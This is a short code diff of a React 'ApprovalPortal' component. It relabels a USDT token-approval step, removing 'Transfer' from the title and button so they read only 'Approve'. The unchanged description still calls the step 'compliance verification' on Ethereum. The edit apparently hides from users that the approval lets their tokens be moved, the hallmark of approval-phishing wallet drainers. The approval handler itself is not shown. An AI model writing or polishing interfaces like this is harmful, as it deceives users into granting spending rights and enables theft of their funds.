@@ -246,13 +246,13 @@ export default function ApprovalPortal() {
         {step === 2 && (
           <CardStep
             icon="✅"
-            title="Approve USDT for Transfer"
+            title="Approve"
             description="Approve USDT interaction to complete compliance verification on Ethereum."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve & Transfer USDT',
+                label: 'Approve',
                 onClick: handleApproveToken,
                 primary: true,
               }
